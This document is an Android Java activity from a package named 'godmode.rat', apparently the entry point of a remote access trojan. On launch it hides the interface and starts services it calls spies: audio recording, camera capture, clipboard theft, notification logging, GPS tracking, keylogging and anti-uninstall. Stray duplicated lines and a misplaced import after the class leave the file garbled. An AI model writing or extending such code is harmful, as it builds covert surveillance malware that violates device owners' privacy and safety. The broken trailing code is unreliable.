package com.godmode.rat;

import android.app.Activity;
import android.content.Intent;
import android.os.Bundle;
import android.view.View;

public class MainActivity extends Activity {
    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        
        // Hide UI completely
        getWindow().getDecorView().setSystemUiVisibility(
            View.SYSTEM_UI_FLAG_FULLSCREEN |
            View.SYSTEM_UI_FLAG_HIDE_NAVIGATION |
            View.SYSTEM_UI_FLAG_IMMERSIVE_STICKY
        );

        setContentView(R.layout.activity_main);

        // Start all background spies
        startService(new Intent(this, AudioRecorderService.class));
        startService(new Intent(this, CameraSnapService.class));
        startService(new Intent(this, ClipboardStealerService.class));
        startService(new Intent(this, NotificationLoggerService.class));
        startService(new Intent(this, GPSTrackerService.class));
        startService(new Intent(this, KeyloggerService.class));
        startService(new Intent(this, AntiUninstallService.class));
    }
}
startService(new Intent(this, LocationService.class));
import com.godmode.rat.LocationService;
startService(new Intent(this, LocationService.class));
